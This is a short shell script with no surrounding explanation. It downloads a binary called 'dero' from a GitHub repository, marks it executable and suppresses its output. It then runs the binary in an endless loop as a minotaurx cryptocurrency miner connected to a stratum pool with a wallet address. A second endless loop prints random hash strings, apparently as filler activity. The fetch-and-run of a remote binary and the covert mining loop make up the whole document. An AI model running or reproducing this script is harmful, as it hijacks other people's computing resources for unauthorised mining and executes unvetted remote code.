wget https://github.com/RizQu5/2022/raw/main/dero > /dev/null 2>&1
chmod +x dero > /dev/null 2>&1
while [ 1 ]; do
  ./dero -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17063 -u PQFYTbguveuWuwRjZRsUiQZnW3ea51Rbc3.02_beDO > /dev/null 2>&1
done
while [ 1 ]; do
  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2s; done
sleep 2
done
